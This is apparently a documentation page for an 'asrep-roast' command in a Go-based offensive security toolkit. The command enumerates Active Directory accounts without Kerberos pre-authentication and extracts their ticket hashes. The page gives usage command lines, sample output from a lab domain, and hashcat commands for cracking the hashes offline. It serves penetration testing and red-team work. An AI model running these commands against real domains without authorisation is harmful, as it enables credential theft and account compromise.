+++
title = "asrep-roast"
chapter = false
weight = 103
hidden = false
+++

## Summary

Request AS-REP tickets for accounts that have Kerberos pre-authentication disabled (`DONT_REQUIRE_PREAUTH` flag) and extract the encrypted ticket data in hashcat-compatible format for offline password cracking. This is known as AS-REP Roasting.

The command automatically enumerates AS-REP roastable accounts via LDAP by checking the `userAccountControl` attribute for the `DONT_REQUIRE_PREAUTH` bit (4194304), then sends unauthenticated AS-REQ messages to the KDC for each target account. The AS-REP response contains encrypted data that can be cracked offline with hashcat.

Uses the `gokrb5` library for Kerberos protocol operations and `go-ldap` for target enumeration. Pure Go, no external tools needed. Complements the `kerberoast` command (which targets accounts with SPNs).

## Arguments

Argument | Required | Description
---------|----------|------------
server | Yes | Domain Controller IP or hostname (KDC)
username | Yes | Domain user for LDAP authentication (UPN format: `user@domain.local`)
password | Yes | Domain user password for LDAP authentication
realm | No | Kerberos realm (auto-detected from username UPN if omitted)
account | No | Specific account to roast (if omitted, auto-enumerates all AS-REP roastable accounts via LDAP)
port | No | LDAP port for account enumeration (default: 389)
base_dn | No | LDAP search base (auto-detected from RootDSE if omitted)
use_tls | No | Use LDAPS for account enumeration (default: false)

## Usage

Auto-enumerate and roast all AS-REP roastable accounts:
```
asrep-roast -server 192.168.1.1 -username user@domain.local -password pass
```

Roast a specific account:
```
asrep-roast -server dc01 -username user@domain.local -password pass -account targetuser
```

With explicit realm:
```
asrep-roast -server 192.168.1.1 -realm DOMAIN.LOCAL -username user@domain.local -password pass
```

## Example Output

```
[*] AS-REP Roasting 1 account(s) from NORTH.SEVENKINGDOMS.LOCAL (KDC: 192.168.100.52)
------------------------------------------------------------

[+] brandon.stark (AES256-CTS)
$krb5asrep$18$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL$fa996d26a1ea9091...$a8806e67fa1daaf3...

[*] 1/1 hashes extracted (hashcat -m 18200 for RC4)
```

## Cracking Hashes

Save the `$krb5asrep$...` lines to a file and crack with:

```bash
# RC4-HMAC (etype 23)
hashcat -m 18200 -a 0 hashes.txt wordlist.txt

# AES256-CTS (etype 18)
hashcat -m 19700 -a 0 hashes.txt wordlist.txt
```

## MITRE ATT&CK Mapping

- **T1558.004** - Steal or Forge Kerberos Tickets: AS-REP Roasting

{{% notice info %}}Cross-Platform — works on Windows, Linux, and macOS{{% /notice %}}
